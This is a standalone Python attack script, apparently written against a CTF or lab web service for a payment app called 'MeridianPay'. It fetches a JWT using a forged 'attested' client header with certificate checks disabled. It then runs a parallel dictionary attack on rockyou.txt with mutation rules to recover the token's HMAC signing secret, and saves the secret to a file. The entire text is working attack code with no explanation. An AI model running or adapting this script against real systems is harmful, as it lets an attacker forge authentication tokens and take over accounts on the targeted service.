import base64, hashlib, hmac, json, os, ssl, urllib.request
from multiprocessing import Pool

BASE = "https://web-3f25599ac74e8a91.web.h7tex.com"
CTX = ssl.create_default_context(); CTX.check_hostname=False; CTX.verify_mode=ssl.CERT_NONE
r = urllib.request.Request(BASE+"/api/v1/auth/device", data=json.dumps({"device_id":"rules"}).encode(),
                           method="POST", headers={"Content-Type":"application/json","X-Meridian-Client":"MeridianPay-Android/3.2.1 (attested)"})
with urllib.request.urlopen(r, context=CTX, timeout=15) as f:
    TOKEN = json.loads(f.read())["token"]
h0, p0, s0 = TOKEN.split(".")
SIGNING = (h0+"."+p0).encode()
SIG = base64.urlsafe_b64decode(s0+"="*(-len(s0)%4))

DIG = [b"0",b"1",b"2",b"3",b"4",b"5",b"6",b"7",b"8",b"9",b"12",b"13",b"99",b"00",b"01",b"26",b"123",b"2026"]
PUN = [b"!",b".",b"@",b"_"]
LEET = {ord(b"a"): b"@", ord(b"e"): b"3", ord(b"i"): b"1", ord(b"o"): b"0", ord(b"s"): b"5", ord(b"t"): b"7", ord(b"g"): b"9", ord(b"l"): b"1"}
N = 12
PATH = "rockyou.txt"
SIZE = os.path.getsize(PATH)

def variants(w):
    out = [w, w.capitalize(), w.upper()]
    for d in DIG:
        out.append(w+d); out.append(d+w)
    for p in PUN:
        out.append(w+p); out.append(w+p+p)
    out.append(w+w)
    out.append(w[::-1])
    return out

def crack(rng):
    a, b = rng
    new, sha, cd = hmac.new, hashlib.sha256, hmac.compare_digest
    with open(PATH, "rb") as f:
        f.seek(a)
        if a: f.readline()
        pos = f.tell()
        while pos < b:
            line = f.readline()
            if not line: break
            pos = f.tell()
            w = line.rstrip(b"\r\n")
            if not w: continue
            for k in variants(w):
                if cd(new(k, SIGNING, sha).digest(), SIG):
                    return k
    return None

if __name__ == "__main__":
    step = SIZE // N
    jobs = [(i*step, (i+1)*step if i < N-1 else SIZE) for i in range(N)]
    print("rule crack over", SIZE, "bytes", flush=True)
    with Pool(N) as pool:
        hit = None
        for res in pool.imap_unordered(crack, jobs):
            if res:
                hit = res; pool.terminate(); break
    print("RULE HIT:", hit, flush=True)
    if hit:
        open("jwt_secret.bin","wb").write(hit)
